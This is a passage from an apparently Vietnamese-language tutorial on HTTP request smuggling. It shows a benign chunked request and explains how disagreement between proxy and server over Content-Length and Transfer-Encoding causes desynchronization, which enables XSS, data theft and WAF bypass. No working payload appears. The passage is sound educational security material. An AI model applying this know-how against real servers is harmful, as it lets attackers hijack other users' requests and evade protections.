Transfer-Encoding: chunked

1d
param1=HelloWorld&param2=Test
0
```

Trong trường hợp này, header `Transfer-Encoding` chỉ ra mã hóa `chunked`. Phần thân được chia thành các đoạn (chunks), kích thước của mỗi đoạn được biểu diễn dưới dạng số hệ thập lục phân. Đoạn cuối cùng có kích thước là `0` để báo hiệu kết thúc.

#### Xung đột giữa `Content-Length` và `Transfer-Encoding`

Theo chuẩn HTTP/1.1, nếu một yêu cầu chứa cả hai header `Content-Length` và `Transfer-Encoding`, header `Transfer-Encoding` sẽ được ưu tiên và `Content-Length` sẽ bị bỏ qua.

### Desynchronization (Tình trạng không đồng bộ)

Tấn công HTTP Request Smuggling khai thác sự khác biệt giữa reverse proxy và web server trong việc phân tích yêu cầu HTTP, gây ra **desynchronization**. Điều này có thể do lỗi phần mềm, không hỗ trợ mã hóa `chunked`, hoặc phân tích sai các header `Content-Length` và `Transfer-Encoding`.

Khi reverse proxy và web server không đồng ý về ranh giới yêu cầu HTTP, dữ liệu có thể bị hiểu sai giữa các hệ thống, dẫn đến các lỗi bảo mật nghiêm trọng. Một kẻ tấn công có thể tạo ra một yêu cầu được thiết kế đặc biệt để gây ra tình trạng không đồng bộ, từ đó có thể kiểm soát các yêu cầu tiếp theo của người dùng khác:

- **Mass exploitation**: Tấn công hàng loạt, bao gồm các kiểu tấn công XSS, đánh cắp dữ liệu người dùng.
- **WAF bypasses**: Bỏ qua các kiểm tra bảo mật của WAF.

---
9
